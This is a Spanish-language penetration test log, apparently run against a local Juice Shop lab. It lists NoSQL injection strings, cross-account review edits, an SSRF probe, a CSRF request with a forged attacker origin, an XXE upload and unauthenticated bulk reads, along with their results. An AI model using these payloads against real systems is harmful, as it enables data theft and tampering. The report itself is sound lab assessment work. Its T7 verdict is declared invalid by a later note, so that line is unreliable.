# Pruebas del cierre técnico — 2026-11-23T23:33:33+00:00

Objetivo: http://juice-lab:3000. Cuentas nuevas A y B. Tokens no se registran.

| ID | Caso | Petición | HTTP | Efecto real | Veredicto |
|---|---|---|---|---|---|
| T1 | NoSQL: reseñas de otros productos | `GET /rest/products/1 || true/reviews` | 200 | reseñas del producto 1: 2; con la inyección: 29 | **VULNERABLE** |
| T2 | NoSQL: todos los pedidos | `GET /rest/track-order/x'||'1'=='1` | 200 | pedidos devueltos: 3 | **VULNERABLE** |
| T3 | NoSQL: modificar todas las reseñas | `PATCH /rest/products/reviews {id:{$ne:-1}}` | 200 | reseñas modificadas: 29 | **VULNERABLE** |
| T4 | Reseña de otra cuenta | `PATCH /rest/products/reviews {id:<reseña de A>} (B)` | 200 | texto alterado: sí | **VULNERABLE** |
| T5 | SSRF hacia un servicio interno | `POST /profile/image/url imageUrl=http://juice-waf:8080/…` | 302 | ver marca ssrf-sonda-1795476813 en el log de acceso del WAF (lo comprueba el ejecutor) | **PENDIENTE DE LOG** |
| T6 | CSRF: perfil con Origin ajeno | `POST /profile (cookie, Origin: https://atacante.example)` | 302 | nombre cambiado: sí | **VULNERABLE** |
| T6b | Control: perfil sin Origin ajeno (uso legítimo) | `POST /profile (cookie)` | 302 | nombre cambiado: sí | **PROTEGIDO** |
| T7 | XXE: entidad externa con archivo local | `POST /file-upload (xxe.xml)` | 410 | contenido en la respuesta: no; resolución en el servidor: ver marca xxe-sonda-1795476813 en el log de la app | **PENDIENTE DE LOG** |
| T8 | 5xx con mensaje interno de la BD | `POST /api/Feedbacks (UserId inexistente)` | 500 | cuerpo: {"message":"internal error","errors":["SQLITE_CONSTRAINT: FOREIGN KEY  | **VULNERABLE** |
| T9 | Quejas de otras cuentas | `GET /api/Complaints (B)` | 200 | queja de A visible: sí | **VULNERABLE** |
| T10 | Reciclajes sin sesión y en lote | `GET /api/Recycles/[1..10] (sin token)` | 200 | registros devueltos: 10 | **VULNERABLE** |

**Resultado parcial: 8 VULNERABLE, 1 PROTEGIDO, 2 pendientes de log o no concluyentes.**

## Comprobación en logs (ejecutor, 2026-11-23T17:33:35-06:00)
- T7 XXE (juice-lab, safetyMode disabled): líneas del log con la marca `xxe-sonda-1795476813` y el contenido de package.json resuelto: 0 → **PROTEGIDO (entidad no resuelta)**
- T5 SSRF: no aplica en esta red (sin WAF); medido en 02-antes y 04-despues.

> **Nota posterior:** el veredicto de T7 de este archivo no es válido (criterio de detección insuficiente). Ver `../xxe-dirigida.md`.
